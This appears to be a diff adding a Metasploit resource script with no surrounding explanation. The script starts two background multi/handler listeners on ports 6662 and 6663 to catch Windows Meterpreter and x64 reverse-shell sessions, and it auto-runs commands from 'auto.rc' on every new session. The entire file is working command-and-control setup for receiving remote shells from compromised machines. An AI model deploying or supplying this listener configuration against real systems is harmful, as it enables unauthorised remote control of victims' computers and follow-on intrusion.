@@ -1,0 +1,17 @@
+set SessionLogging true
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 6662
+set ExitOnSession false
+set AutoRunScript multi_console_command -rc auto.rc
+exploit -j -z
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 6663
+set ExitOnSession false
+set AutoRunScript multi_console_command -rc auto.rc
+exploit -j -z
